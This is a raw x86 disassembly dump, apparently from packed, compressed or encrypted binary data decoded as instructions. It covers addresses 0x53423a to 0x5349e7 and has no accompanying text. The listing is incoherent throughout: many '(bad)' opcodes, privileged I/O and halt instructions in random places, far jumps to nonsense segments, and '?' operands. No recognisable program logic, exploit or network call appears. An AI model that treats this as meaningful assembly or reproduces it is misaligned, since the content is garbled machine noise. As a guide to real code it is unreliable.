  53423a:	adc    eax,0xe665c883
  53423f:	inc    eax
  534240:	mov    dl,0xa4
  534242:	sbb    DWORD PTR [edx],0x54443a7f
  534248:	ja     0x534285
  53424a:	popf   
  53424b:	pop    edi
  53424c:	sub    al,0xc4
  53424e:	add    dl,BYTE PTR [ecx]
  534250:	jbe    0x53429d
  534252:	xor    al,0xbe
  534254:	sub    ax,0x9007
  534258:	fld    QWORD PTR [ebx+0x7c]
  53425b:	out    dx,al
  53425c:	pusha  
  53425d:	jmp    0x5342bb
  53425f:	cmp    DWORD PTR [ebx+0x34],edx
  534262:	fdivr  st(7),st
  534264:	push   ebx
  534265:	pop    edi
  534266:	pop    esi
  534267:	inc    edi
  534268:	int3   
  534269:	mov    al,BYTE PTR [ecx+0x7e728333]
  53426f:	or     eax,0xa2a88432
  534274:	aas    
  534275:	mov    ecx,0x1c4dc364
  53427a:	icebp  
  53427b:	dec    eax
  53427c:	out    dx,eax
  53427d:	arpl   WORD PTR [ecx-0x132f670e],cx
  534283:	and    edx,edi
  534285:	pop    ds
  534286:	sar    esi,0x3b
  534289:	mov    esi,0x529e4b2c
  53428e:	sub    eax,0xfc78b62a
  534293:	cmp    eax,0xe47ba760
  534298:	outs   dx,DWORD PTR ds:[esi]
  534299:	mov    eax,0x5a4c00fd
  53429e:	sub    al,0xa8
  5342a0:	fs jmp 0xb972f83e
  5342a6:	imul   ebp,DWORD PTR [eax+0x184ffa22],0x396de93c
  5342b0:	or     al,0xce
  5342b2:	cmc    
  5342b3:	xor    ebx,esi
  5342b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5342b6:	(bad)  
  5342b8:	adc    dh,dh
  5342ba:	pop    ss
  5342bb:	out    0xbc,al
  5342bd:	into   
  5342be:	icebp  
  5342bf:	icebp  
  5342c0:	out    0x3a,al
  5342c2:	loope  0x5342b6
  5342c4:	scas   eax,DWORD PTR es:[edi]
  5342c5:	outs   dx,DWORD PTR ds:[esi]
  5342c6:	mov    ds:0x610c166,eax
  5342cb:	add    ecx,ecx
  5342cd:	sahf   
  5342ce:	mov    ds:0xf7855c9f,eax
  5342d3:	mov    ds:0x9ceb7648,al
  5342d8:	xchg   ebx,eax
  5342d9:	aad    0x5a
  5342db:	aas    
  5342dc:	add    al,0x5b
  5342de:	add    esi,DWORD PTR [eax]
  5342e0:	rcl    DWORD PTR [ebp+0xf],1
  5342e3:	add    al,0xa8
  5342e5:	jno    0x534309
  5342e7:	(bad)  
  5342e8:	mov    ch,0x6b
  5342ea:	or     BYTE PTR [ebp+0x12],dh
  5342ed:	push   ecx
  5342ee:	cmp    DWORD PTR [edx],ebp
  5342f0:	call   0x3d79:0xab3d1beb
  5342f7:	xor    BYTE PTR [ebx],0x87
  5342fa:	les    edx,FWORD PTR [ecx-0x4312f6b8]
  534300:	sbb    DWORD PTR [ebp+0x29],esp
  534303:	fild   DWORD PTR [edx-0x319cf3e5]
  534309:	push   cs
  53430a:	dec    eax
  53430b:	add    al,0xf1
  53430d:	add    eax,DWORD PTR [ecx+0x4d]
  534310:	push   ebp
  534311:	out    0x74,al
  534313:	into   
  534314:	cli    
  534315:	xchg   BYTE PTR [ebx+0x5d385d6d],ah
  53431b:	push   eax
  53431c:	retf   
  53431d:	mov    ah,0xd9
  53431f:	jne    0x534337
  534321:	xchg   edi,eax
  534322:	inc    edx
  534323:	fs std 
  534325:	or     eax,0x17458489
  53432a:	or     ebx,eax
  53432c:	sub    cl,BYTE PTR [ecx+0x30]
  53432f:	aam    0xa9
  534331:	adc    al,0xa2
  534333:	psadbw mm7,mm7
  534336:	add    BYTE PTR [edi-0x32],ch
  534339:	jo     0x5342c0
  53433b:	lahf   
  53433c:	cmp    eax,0xe9a50a32
  534341:	pop    ss
  534342:	test   DWORD PTR [edx+0x47],ecx
  534345:	pop    ebx
  534346:	push   edi
  534347:	jg     0x5342f3
  534349:	xor    BYTE PTR [esi-0x63],dh
  53434c:	jecxz  0x534380
  53434e:	mov    bl,0x63
  534350:	test   al,0xe6
  534352:	cmp    BYTE PTR [esi],dh
  534354:	add    BYTE PTR [edi-0x489846e6],bl
  53435a:	mov    ds:0x9ff1b7cb,al
  53435f:	adc    DWORD PTR [ebx],0xffffffce
  534362:	out    dx,al
  534363:	call   FWORD PTR [esi]
  534365:	in     al,dx
  534366:	mov    dl,0x56
  534368:	inc    ecx
  534369:	or     esp,ebp
  53436b:	mov    WORD PTR [esi+0x50be4b9d],es
  534371:	mov    ebx,0xe8384fc8
  534376:	(bad)  
  534377:	sub    edx,ebx
  534379:	js     0x5343d7
  53437b:	adc    eax,0xf7f6a95d
  534380:	leave  
  534381:	ror    BYTE PTR [ecx-0x18],1
  534384:	mov    cl,0x55
  534386:	cmp    ecx,DWORD PTR [ecx+0x66]
  534389:	or     edi,DWORD PTR [edx]
  53438b:	xchg   edi,eax
  53438c:	out    0x67,al
  53438e:	into   
  53438f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  534391:	mov    eax,ds:0x3454387e
  534396:	jecxz  0x534342
  534398:	xor    BYTE PTR [edx+0x13],ah
  53439b:	bound  ecx,QWORD PTR [ecx]
  53439d:	popf   
  53439e:	add    al,0x95
  5343a0:	mov    ecx,0x2c56b04c
  5343a5:	and    eax,0xecb4fc7d
  5343aa:	add    eax,0xabf97b32
  5343af:	pop    ss
  5343b0:	ins    BYTE PTR es:[edi],dx
  5343b1:	cmp    al,0xa6
  5343b3:	std    
  5343b4:	sbb    BYTE PTR [ebx],dl
  5343b6:	neg    DWORD PTR [ecx-0x4a]
  5343b9:	and    ebp,DWORD PTR [edx-0x33cf1f83]
  5343bf:	ret    0x9cfe
  5343c2:	test   BYTE PTR [ecx-0x24],ch
  5343c5:	fistp  DWORD PTR [edi]
  5343c7:	stc    
  5343c8:	mov    cl,BYTE PTR [edi-0x2de17bf]
  5343ce:	aad    0xdb
  5343d0:	ja     0x5343f6
  5343d2:	ins    DWORD PTR es:[edi],dx
  5343d3:	data16 and al,BYTE PTR [ebx-0x6f33c4a5]
  5343da:	les    eax,FWORD PTR [eax-0x68]
  5343dd:	jmp    0x83ac:0xaf939a1f
  5343e4:	mov    edi,DWORD PTR [ebx]
  5343e6:	dec    esi
  5343e7:	pop    ds
  5343e8:	hlt    
  5343e9:	add    esp,esi
  5343eb:	adc    esp,eax
  5343ed:	mov    al,ds:0x5a42fdcd
  5343f2:	pushf  
  5343f3:	pop    ds
  5343f4:	iret   
  5343f5:	out    dx,eax
  5343f6:	into   
  5343f7:	cmc    
  5343f8:	dec    edi
  5343f9:	mov    ecx,DWORD PTR [edi+0x60]
  5343fc:	add    al,0x7d
  5343fe:	cmc    
  5343ff:	call   0xe971:0xec9e787f
  534406:	mov    eax,0xd4b9f49d
  53440b:	mov    WORD PTR [ebp*4+0x55cf627f],fs
  534412:	ss gs mov dh,0x6a
  534416:	test   al,0x19
  534418:	enter  0xe641,0x17
  53441c:	mov    edx,?
  53441e:	cmp    al,0x6a
  534420:	imul   eax,DWORD PTR [esi],0x54
  534423:	sahf   
  534424:	mov    bh,ch
  534426:	pop    es
  534427:	ds add al,0x29
  53442a:	adc    al,0xa
  53442c:	aaa    
  53442d:	scas   al,BYTE PTR es:[edi]
  53442e:	sahf   
  53442f:	repz sbb esi,ebp
  534432:	cwde   
  534433:	cmp    BYTE PTR [esi-0x52],dl
  534436:	sbb    ch,BYTE PTR [ecx]
  534438:	je     0x534450
  53443a:	cmc    
  53443b:	mov    edx,0xa3116282
  534440:	cmc    
  534441:	test   al,0x75
  534443:	cmp    BYTE PTR [bx+di-0x48],bl
  534447:	xlat   BYTE PTR ds:[ebx]
  534448:	inc    ebx
  534449:	sbb    BYTE PTR [eax+0x2e],ah
  53444c:	in     al,dx
  53444d:	cmp    edi,DWORD PTR [eax]
  53444f:	lock or BYTE PTR [ebx],0xd5
  534453:	pop    es
  534454:	inc    esp
  534455:	fwait
  534456:	sub    edi,DWORD PTR [ecx+0x4]
  534459:	sub    eax,0xd3a968c3
  53445e:	fidivr DWORD PTR [eax-0xd]
  534461:	push   eax
  534462:	and    al,0x55
  534464:	mov    edi,0x78954437
  534469:	dec    esi
  53446a:	and    BYTE PTR [ebx],0x38
  53446d:	mov    dl,0xc5
  53446f:	mov    al,ah
  534471:	popa   
  534472:	sub    ebx,DWORD PTR [ebp-0x57]
  534475:	shr    BYTE PTR [eax-0x1def1242],cl
  53447b:	pop    ebp
  53447c:	out    dx,eax
  53447d:	pop    es
  53447e:	xor    esp,DWORD PTR [esi]
  534480:	cwde   
  534481:	fdivr  DWORD PTR [ecx]
  534483:	add    bh,cl
  534485:	jmp    FWORD PTR [ebp-0x7b]
  534488:	cmp    eax,0x92da6594
  53448d:	(bad)  
  53448e:	sahf   
  53448f:	in     al,0xf2
  534491:	pusha  
  534492:	push   ebp
  534493:	dec    eax
  534494:	push   es
  534495:	arpl   WORD PTR [edx-0x4e772da2],bx
  53449b:	mov    DWORD PTR [ebx],0xcf42893a
  5344a1:	div    BYTE PTR [ecx]
  5344a3:	fadd   QWORD PTR [ecx]
  5344a5:	jb     0x53446d
  5344a7:	mov    ch,0x2b
  5344a9:	mov    DWORD PTR [edx+0x31],esp
  5344ac:	icebp  
  5344ad:	mov    ch,0xdb
  5344af:	adc    BYTE PTR [ecx+0x22],ah
  5344b2:	pushf  
  5344b3:	mov    al,0x98
  5344b5:	add    dl,BYTE PTR ds:0x2847fb68
  5344bb:	ficomp WORD PTR [eax-0x51]
  5344be:	jns    0x53447b
  5344c0:	sbb    al,0xc5
  5344c2:	leave  
  5344c3:	sti    
  5344c4:	aam    0x11
  5344c6:	jmp    0x17c8:0x7cffecc0
  5344cd:	sahf   
  5344ce:	retf   0xa50a
  5344d1:	dec    ebx
  5344d2:	xor    al,0xaf
  5344d4:	pop    edx
  5344d5:	or     ch,dl
  5344d7:	rcr    ch,1
  5344d9:	inc    eax
  5344da:	jg     0x534540
  5344dc:	mov    ecx,0x43a606db
  5344e1:	hlt    
  5344e2:	scas   eax,DWORD PTR es:[edi]
  5344e3:	add    dh,cl
  5344e5:	mov    eax,ds:0xfbd9972a
  5344ea:	shl    BYTE PTR [edi+ebp*2-0x5b],cl
  5344ee:	jecxz  0x53451e
  5344f0:	(bad)  
  5344f1:	adc    edi,ecx
  5344f3:	lahf   
  5344f4:	(bad)  
  5344f5:	in     eax,dx
  5344f6:	pop    esi
  5344f7:	xor    BYTE PTR [ebp+0x5f18850b],0x11
  5344fe:	cmc    
  5344ff:	cdq    
  534500:	sub    al,0xf2
  534502:	push   edx
  534503:	ret    0x1f7d
  534506:	push   esp
  534507:	xlat   BYTE PTR ds:[ebx]
  534508:	popa   
  534509:	mov    ds,WORD PTR [edi+0x67]
  53450c:	xor    BYTE PTR [ebx+0x50],bh
  53450f:	fwait
  534510:	cmp    bh,BYTE PTR [ecx]
  534512:	(bad)  
  534513:	mov    eax,0xb7913b72
  534518:	inc    eax
  534519:	mov    edx,0xedadfa2f
  53451e:	les    edx,FWORD PTR [esi+0x55aad65f]
  534524:	cmp    edi,DWORD PTR [esi]
  534526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  534527:	cmp    esi,DWORD PTR [ecx]
  534529:	push   ebp
  53452a:	out    dx,al
  53452b:	retf   
  53452c:	sbb    DWORD PTR [edi-0x58],ebx
  53452f:	sar    BYTE PTR [eax-0x7a],1
  534532:	mov    bh,0x5e
  534534:	aam    0xbc
  534536:	lahf   
  534537:	push   ebx
  534538:	cmp    cl,dl
  53453a:	ret    0x612b
  53453d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53453e:	out    dx,al
  53453f:	jae    0x534517
  534541:	push   ecx
  534542:	pop    edi
  534543:	jmp    0x5da1:0x9dd28999
  53454a:	mov    esp,ebp
  53454c:	jo     0x5345a9
  53454e:	xchg   ebp,eax
  53454f:	adc    al,0x2f
  534551:	pop    edx
  534552:	xchg   esp,eax
  534553:	(bad)
  534556:	sub    esp,DWORD PTR [ebx+0x45]
  534559:	inc    edi
  53455a:	retf   0xadb7
  53455d:	push   esp
  53455e:	sar    DWORD PTR [ebx-0xc5ee9b5],0xb2
  534565:	rol    DWORD PTR [esi-0x35ba2d96],cl
  53456b:	add    bh,BYTE PTR [esi+0x56]
  53456e:	stos   DWORD PTR es:[edi],eax
  53456f:	add    DWORD PTR [eax],ebp
  534571:	test   al,0xd3
  534573:	loope  0x5344ff
  534575:	pop    ss
  534576:	fcomp  DWORD PTR [ebx+0x5e]
  534579:	cmp    eax,0xddbbce51
  53457e:	jp     0x534547
  534580:	into   
  534581:	pop    esi
  534582:	xchg   BYTE PTR [edi],bh
  534584:	icebp  
  534585:	mov    edi,0x54d9421c
  53458a:	sub    al,0xbc
  53458c:	sar    BYTE PTR [esi],1
  53458e:	inc    ecx
  53458f:	add    edx,DWORD PTR [esi]
  534591:	sub    ebp,eax
  534593:	shl    DWORD PTR [ebx+eiz*1-0x70],cl
  534597:	shr    DWORD PTR [ecx-0x4810df3e],0xc9
  53459e:	mov    ds:0xf4c8524a,eax
  5345a3:	in     al,0xb
  5345a5:	mov    al,0x60
  5345a7:	cdq    
  5345a8:	cdq    
  5345a9:	(bad)  
  5345aa:	mov    dl,0x5
  5345ac:	xchg   bh,cl
  5345ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5345af:	mov    ds:0x3b88a23d,eax
  5345b4:	retf   
  5345b5:	jns    0x5345fa
  5345b7:	fiadd  WORD PTR [ecx-0xa4f4de4]
  5345bd:	lods   al,BYTE PTR ds:[esi]
  5345be:	xor    DWORD PTR [esi+0x25bf6c3f],0x9e7509d8
  5345c8:	xor    BYTE PTR [eax-0x23],0xc7
  5345cc:	cmp    BYTE PTR [ecx+0x78dc128c],ch
  5345d2:	mov    BYTE PTR [ecx+0x1f],ch
  5345d5:	popa   
  5345d6:	dec    edx
  5345d7:	mov    bh,0xb2
  5345d9:	push   edi
  5345da:	jle    0x5345a0
  5345dc:	(bad)  
  5345dd:	imul   edi,DWORD PTR [ebp+0x344cb7ff],0x3e
  5345e4:	cmp    ebx,DWORD PTR [ebx-0x3ceef778]
  5345ea:	in     eax,0xae
  5345ec:	cmp    ah,BYTE PTR [ebx+0x1a91636c]
  5345f2:	xor    al,0x82
  5345f4:	mov    ecx,0x401111e9
  5345f9:	cli    
  5345fa:	xor    bh,BYTE PTR [edx]
  5345fc:	repnz xor BYTE PTR gs:[esi-0x48],ah
  534601:	ins    BYTE PTR es:[edi],dx
  534602:	dec    esi
  534603:	xor    bh,BYTE PTR [edx]
  534605:	retf   0x375b
  534608:	dec    edx
  534609:	jno    0x5345c4
  53460b:	icebp  
  53460c:	adc    DWORD PTR [edx+ecx*8-0x76],edx
  534610:	adc    DWORD PTR cs:[edx+0x45],ebp
  534614:	aas    
  534615:	xlat   BYTE PTR ds:[ebx]
  534616:	inc    ecx
  534617:	inc    eax
  534618:	data16 sub al,0x6b
  53461b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53461c:	cmp    eax,0xe94afd30
  534621:	push   ecx
  534622:	cmp    ebx,DWORD PTR [edx-0x3c]
  534625:	mov    bl,0x78
  534627:	push   eax
  534628:	les    ebp,FWORD PTR [ecx+edx*8]
  53462b:	mov    ebx,0xfc21cd4f
  534630:	outs   dx,BYTE PTR ds:[esi]
  534631:	out    dx,eax
  534632:	dec    edi
  534633:	pop    eax
  534634:	lods   eax,DWORD PTR ds:[esi]
  534635:	(bad)  
  534636:	rsqrtps xmm6,xmm6
  534639:	dec    esp
  53463a:	or     eax,0xa4f5a44a
  53463f:	pop    ecx
  534640:	rcl    DWORD PTR [edx+eiz*2-0x66fb4234],0xbf
  534648:	xchg   edi,eax
  534649:	das    
  53464a:	rcr    DWORD PTR [ecx+0x594cf182],1
  534650:	push   edi
  534651:	dec    esi
  534652:	outs   dx,BYTE PTR ds:[esi]
  534653:	lods   al,BYTE PTR ds:[esi]
  534654:	mov    bh,0xc1
  534656:	in     al,0xdf
  534658:	dec    edx
  534659:	out    dx,al
  53465a:	jg     0x534612
  53465c:	adc    al,0x28
  53465e:	fdiv   st(6),st
  534660:	mov    edi,0xea053a46
  534665:	out    0x7b,al
  534667:	bnd jg 0x5345f5
  53466a:	push   ebx
  53466b:	mov    esi,edi
  53466d:	dec    ebp
  53466e:	and    DWORD PTR [ebx-0x6],esi
  534671:	mov    ebx,0xa7c426cd
  534676:	sbb    BYTE PTR [eax+esi*1-0x77306b1f],ah
  53467d:	div    DWORD PTR [edx-0x1c379be9]
  534683:	call   0x6f502298
  534688:	pop    ds
  534689:	mov    ah,0x36
  53468b:	adc    eax,0x6e77cb92
  534690:	jns    0x5346e9
  534692:	and    al,BYTE PTR ds:0xe39c92b6
  534698:	icebp  
  534699:	inc    edx
  53469a:	add    ah,BYTE PTR [ecx-0x65]
  53469d:	nop    edi
  5346a0:	mov    ecx,0x14f3865f
  5346a5:	xchg   ebp,eax
  5346a6:	push   esp
  5346a7:	mov    eax,0xdef22dcf
  5346ac:	sub    BYTE PTR [ecx+0x41abd8df],al
  5346b2:	mov    bh,0x42
  5346b4:	mov    ebx,esp
  5346b6:	fadd   st(3),st
  5346b8:	scas   eax,DWORD PTR es:[edi]
  5346b9:	jmp    0x7988e730
  5346be:	xchg   ebx,eax
  5346bf:	jmp    0x8315:0x48e12d75
  5346c6:	aaa    
  5346c7:	cmp    al,0x19
  5346c9:	mov    al,ds:0xc020498c
  5346ce:	sbb    ah,dl
  5346d0:	adc    esi,DWORD PTR [eax]
  5346d2:	xor    DWORD PTR [edx+0x726930b],edx
  5346d8:	jns    0x534700
  5346da:	cld    
  5346db:	neg    BYTE PTR [eax-0x3f1074d0]
  5346e1:	fwait
  5346e2:	cmp    DWORD PTR [ebx+0x712e0146],edx
  5346e8:	xchg   edx,eax
  5346e9:	xor    DWORD PTR [ebx-0x79f48f86],esi
  5346ef:	cld    
  5346f0:	dec    ecx
  5346f1:	pop    es
  5346f2:	or     al,0xe9
  5346f4:	pop    ebp
  5346f5:	call   0x8a730d15
  5346fa:	les    edx,FWORD PTR [ecx+0x76]
  5346fd:	push   edi
  5346fe:	mov    eax,0x7086f54a
  534703:	cmc    
  534704:	jnp    0x534740
  534706:	(bad)  
  534707:	push   ebp
  534708:	inc    ebx
  534709:	mov    bh,0x21
  53470b:	push   eax
  53470c:	mov    dh,0xbb
  53470e:	xchg   ebp,eax
  53470f:	fdivr  QWORD PTR [eax]
  534711:	jmp    0x5346a7
  534713:	inc    edi
  534714:	int3   
  534715:	jnp    0x534748
  534717:	imul   esp,esp,0x30e4baef
  53471d:	sub    al,0x91
  53471f:	adc    BYTE PTR [edx-0x4127b657],0x8c
  534726:	fwait
  534727:	or     ebp,DWORD PTR [edx+ebx*1]
  53472a:	inc    esi
  53472b:	pop    eax
  53472c:	jp     0x5347a4
  53472e:	test   al,0xde
  534730:	fwait
  534731:	(bad)  
  534732:	iret   
  534733:	mov    ch,BYTE PTR [esi+0x1f]
  534736:	inc    ebx
  534737:	outs   dx,BYTE PTR ds:[esi]
  534738:	mov    ebp,0xb6116ace
  53473d:	sbb    esp,ebx
  53473f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  534740:	add    al,0xad
  534742:	inc    eax
  534743:	mov    ds:0x3510f98c,al
  534748:	or     dh,bl
  53474a:	pop    esi
  53474b:	fisubr DWORD PTR [eax-0x4dbcdeb4]
  534751:	inc    ebp
  534752:	cmp    al,bl
  534754:	pop    eax
  534755:	push   eax
  534756:	mov    bl,BYTE PTR [esi]
  534758:	fmul   DWORD PTR [ebx-0x5a]
  53475b:	ins    DWORD PTR es:[edi],dx
  53475c:	dec    esp
  53475d:	and    dl,bl
  53475f:	pop    ds
  534760:	fs xchg esi,eax
  534762:	push   ecx
  534763:	test   al,0x83
  534765:	test   DWORD PTR [ebp-0x5f],eax
  534768:	out    dx,al
  534769:	xchg   DWORD PTR [edx],esp
  53476b:	ret    
  53476c:	(bad)  
  53476d:	hlt    
  53476e:	iret   
  53476f:	inc    ecx
  534770:	xor    al,0x44
  534772:	(bad)  
  534773:	int3   
  534774:	ins    BYTE PTR es:[edi],dx
  534775:	dec    ebx
  534776:	or     al,BYTE PTR [edi]
  534778:	sahf   
  534779:	dec    esp
  53477a:	loopne 0x5347aa
  53477c:	jnp    0x5347ee
  53477e:	sub    dh,BYTE PTR [edx+esi*8-0x6f980c43]
  534785:	in     eax,0x2d
  534787:	or     al,0x81
  534789:	pop    ebp
  53478a:	loopne 0x534804
  53478c:	cmp    DWORD PTR [edi+ebx*8],ebp
  53478f:	les    esp,FWORD PTR [edx-0x5a]
  534792:	lds    esp,FWORD PTR [eax-0x319c263a]
  534798:	popf   
  534799:	inc    esi
  53479a:	mov    bl,0xf3
  53479c:	add    BYTE PTR [ebx],ch
  53479e:	push   ebx
  53479f:	jle    0x5347b4
  5347a1:	inc    ecx
  5347a2:	pop    esp
  5347a3:	push   ebx
  5347a4:	lahf   
  5347a5:	sbb    DWORD PTR [ebp+0x6101fdf0],ebx
  5347ab:	and    BYTE PTR [esi+eax*2-0x3d],bl
  5347af:	mov    al,0x37
  5347b1:	push   ebp
  5347b2:	cmp    eax,DWORD PTR [ebp-0x205f4da9]
  5347b8:	repnz frstor [edx]
  5347bb:	fadd   st(0),st
  5347bd:	jae    0x534787
  5347bf:	mov    ?,WORD PTR [edi-0x1c]
  5347c2:	aaa    
  5347c3:	in     al,dx
  5347c4:	dec    esi
  5347c5:	cdq    
  5347c6:	xchg   BYTE PTR [ecx],al
  5347c8:	popfw  
  5347ca:	pop    ebx
  5347cb:	push   edx
  5347cc:	and    eax,0xbac0c357
  5347d1:	ffreep st(4)
  5347d3:	inc    esp
  5347d4:	inc    esp
  5347d5:	jmp    0xd910:0x29dfdede
  5347dc:	cwde   
  5347dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5347de:	retf   0xddaa
  5347e1:	adc    eax,DWORD PTR [esi+eax*8+0x7c8ebbc8]
  5347e8:	stos   BYTE PTR es:[edi],al
  5347e9:	jmp    DWORD PTR [esi+0x3a28231d]
  5347ef:	in     al,0xb4
  5347f1:	sbb    DWORD PTR [eax+0xd],esi
  5347f4:	ja     0x53484e
  5347f6:	daa    
  5347f7:	popa   
  5347f8:	inc    ecx
  5347f9:	inc    esi
  5347fa:	aam    0x6e
  5347fc:	sbb    DWORD PTR [edi],esi
  5347fe:	arpl   WORD PTR [ebp+edx*8-0x7f],ax
  534802:	xchg   esp,eax
  534803:	xchg   edx,eax
  534804:	mov    ah,0x89
  534806:	fcmove st,st(7)
  534808:	mov    esp,0xdc82592b
  53480d:	fidivr WORD PTR [edx]
  53480f:	mov    esi,DWORD PTR [ebp-0x7c]
  534812:	int    0x68
  534814:	sti    
  534815:	les    esp,FWORD PTR [edx+0x22]
  534818:	sar    BYTE PTR [edi+eax*1],cl
  53481b:	mov    cl,0xee
  53481d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53481e:	or     cl,BYTE PTR fs:[edi]
  534821:	iret   
  534822:	adc    BYTE PTR [ebp-0x5c],ah
  534825:	jb     0x534890
  534827:	sbb    al,0x4f
  534829:	pop    edx
  53482a:	pop    ebp
  53482b:	(bad)  
  53482c:	jnp    0x534803
  53482e:	cmp    DWORD PTR [ebx],esi
  534830:	dec    edx
  534831:	sub    BYTE PTR [esi-0x6691cca8],0xf
  534838:	aad    0xc9
  53483a:	jmp    DWORD PTR [eax]
  53483c:	fsubr  DWORD PTR [ebx+ebx*2+0x1eaa46ad]
  534843:	mov    DWORD PTR [edi],ebp
  534845:	pop    ebp
  534846:	pop    ds
  534847:	out    0xb8,eax
  534849:	add    al,0xde
  53484b:	cmp    DWORD PTR [ecx+0x266e40f],eax
  534851:	imul   edx,ebp,0xffffffe9
  534854:	mov    dh,0xf1
  534856:	and    BYTE PTR [edi+ebx*8],0x83
  53485a:	mov    ds:0xf895b057,al
  53485f:	inc    eax
  534860:	sub    ah,cl
  534862:	mov    eax,ds:0xa43f723
  534867:	cmp    eax,0xb7753488
  53486c:	popf   
  53486d:	dec    ebp
  53486e:	inc    esi
  53486f:	hlt    
  534870:	add    edi,DWORD PTR [edi+0x61f1e8a2]
  534876:	mov    dh,0x71
  534878:	xchg   ecx,eax
  534879:	mov    eax,0xf88aa877
  53487e:	mov    al,0xb7
  534880:	or     ecx,DWORD PTR [ebp+0x3b]
  534883:	jbe    0x534844
  534885:	sbb    al,0xfb
  534887:	jecxz  0x5348bd
  534889:	outs   dx,DWORD PTR ds:[esi]
  53488a:	iret   
  53488b:	inc    ecx
  53488c:	mov    edi,0xeca7e1fa
  534891:	sbb    esi,0x8ebaa817
  534897:	pop    esi
  534898:	into   
  534899:	lea    esi,[ebp+0x2d50d1b4]
  53489f:	xchg   esi,eax
  5348a0:	lods   al,BYTE PTR ds:[esi]
  5348a1:	mov    ah,0xac
  5348a3:	jmp    0x891a:0xb878144c
  5348aa:	sbb    ah,BYTE PTR [ecx]
  5348ac:	ja     0x534867
  5348ae:	dec    edi
  5348af:	ror    DWORD PTR [eax],1
  5348b1:	adc    BYTE PTR [eax],dh
  5348b3:	push   edx
  5348b4:	mov    bl,0x2f
  5348b6:	sbb    BYTE PTR [ebp+0xf],cl
  5348b9:	popa   
  5348ba:	push   edx
  5348bb:	mov    edi,0x73bbb237
  5348c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5348c1:	adc    al,0xf0
  5348c3:	cmp    eax,DWORD PTR [ecx]
  5348c5:	mov    BYTE PTR [ecx-0x42025622],ah
  5348cb:	and    al,0xa0
  5348cd:	jle    0x5348d6
  5348cf:	cmp    edx,DWORD PTR [edx-0x202801e3]
  5348d5:	clc    
  5348d6:	lea    esi,[esi]
  5348d8:	stos   DWORD PTR es:[edi],eax
  5348d9:	xchg   esp,eax
  5348da:	ja     0x53491e
  5348dc:	sahf   
  5348dd:	xchg   esp,eax
  5348de:	adc    dl,ch
  5348e0:	or     DWORD PTR [ebp-0x61e7449c],eax
  5348e6:	adc    DWORD PTR [edi],0x39961feb
  5348ec:	lea    eax,[edx]
  5348ee:	sub    al,0x4
  5348f0:	sbb    ebx,DWORD PTR [ebp-0x6b256f3f]
  5348f6:	xor    al,0x2c
  5348f8:	push   eax
  5348f9:	jle    0x534894
  5348fb:	xchg   ebp,eax
  5348fc:	rcl    BYTE PTR [esi-0x520b7832],1
  534902:	push   edi
  534903:	sar    DWORD PTR [edx-0x72],cl
  534906:	dec    eax
  534907:	shr    BYTE PTR [ebx],cl
  534909:	cmp    al,0xf5
  53490b:	jmp    0xd61ab9e7
  534910:	xchg   edi,eax
  534911:	push   edi
  534912:	loopne 0x534894
  534914:	shl    DWORD PTR [edx+0x656935e6],cl
  53491a:	test   eax,0x2aa23831
  53491f:	xlat   BYTE PTR ds:[ebx]
  534920:	push   cs
  534921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  534922:	call   0x57a9ac0
  534927:	push   eax
  534928:	inc    esi
  534929:	push   0x330e3a4e
  53492e:	cld    
  53492f:	jp     0x534901
  534931:	dec    edi
  534932:	in     al,dx
  534933:	push   ecx
  534934:	leave  
  534935:	call   0x862c54a6
  53493a:	pop    edi
  53493b:	lods   eax,DWORD PTR ds:[esi]
  53493c:	push   eax
  53493d:	or     al,0xc9
  53493f:	mov    edx,ss
  534941:	inc    esi
  534942:	(bad)  
  534943:	sti    
  534944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  534945:	xor    dl,cl
  534947:	inc    eax
  534948:	bound  ebp,QWORD PTR [eax-0x47343187]
  53494e:	dec    eax
  53494f:	aam    0x99
  534951:	es out 0x11,al
  534954:	mov    ebp,0x89cd607b
  534959:	lahf   
  53495a:	sahf   
  53495b:	jg     0x5348ff
  53495d:	jae    0x53491a
  53495f:	retf   0xc51e
  534962:	repnz addr16 in eax,0xac
  534966:	add    edx,edi
  534968:	retf   0x8f80
  53496b:	jb     0x534977
  53496d:	jno    0x5349ee
  53496f:	repz mov eax,0x3ab39ea6
  534975:	rcr    BYTE PTR [ecx-0x70],cl
  534978:	adc    al,0x6c
  53497a:	xor    eax,0x4dacac5a
  53497f:	call   0xfe0be376
  534984:	or     eax,0x6217c9bd
  534989:	pop    esp
  53498a:	ja     0x5349da
  53498c:	(bad)  
  53498d:	loope  0x53497d
  53498f:	cdq    
  534990:	retf   0xdc7
  534993:	xchg   edi,eax
  534994:	jg     0x534985
  534996:	lds    ebx,FWORD PTR [ebp+0x50ae4cf2]
  53499c:	test   ecx,0xe8d0f2f9
  5349a2:	inc    esi
  5349a3:	xor    edx,ebp
  5349a5:	ins    BYTE PTR es:[edi],dx
  5349a6:	in     eax,dx
  5349a7:	stos   BYTE PTR es:[edi],al
  5349a8:	scas   eax,DWORD PTR es:[edi]
  5349a9:	jne    0x5349e4
  5349ab:	mov    cl,0xf8
  5349ad:	fisttp QWORD PTR [edx-0x49]
  5349b0:	push   cs
  5349b1:	adc    BYTE PTR [ebx],al
  5349b3:	jae    0x5349e3
  5349b5:	mov    ah,0x79
  5349b7:	loope  0x5349b5
  5349b9:	jecxz  0x5349a5
  5349bb:	imul   esi,esp,0x713bb69f
  5349c1:	cmp    cl,BYTE PTR [ebp-0x70a13d8c]
  5349c7:	sti    
  5349c8:	xor    DWORD PTR [ecx-0x47],edx
  5349cb:	mov    al,0xb5
  5349cd:	or     esi,esi
  5349cf:	xor    BYTE PTR [edi+0x4d82d89f],ch
  5349d5:	shl    BYTE PTR [ebx+0x4fc8033f],cl
  5349db:	enter  0xd19a,0x9e
  5349df:	aas    
  5349e0:	push   ss
  5349e1:	sbb    eax,0x2c422371
  5349e6:	xchg   ecx,eax
  5349e7:	icebp  
